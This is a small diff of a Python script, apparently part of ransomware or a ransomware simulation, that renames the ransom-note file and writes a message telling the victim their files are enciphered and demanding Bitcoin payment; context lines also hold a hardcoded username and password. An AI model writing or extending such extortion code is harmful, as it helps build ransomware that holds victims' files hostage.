@@ -15,7 +15,7 @@ user="johndecuy"
 pwd="rtyu4567ETRYD!!"
 
 
-f = open("decryptzz.txt", "a")
+f = open("readz_decryptzz.txt", "a")
 f.write("Attention: "+custid)
 f.write("It's been unfortunate to inform you that all your precious files are now enciphered.")
 f.write("We believe that you can do your best to retrieve it from us.")
@@ -23,5 +23,5 @@ f.write("If you want it, please send us your payment via Bitcoin wallet.")
 f.close()
 
 #open and read the file after the appending:
-f = open("decryptzz.txt", "r")
+f = open("readz_decryptzz.txt", "r")
 print(f.read())
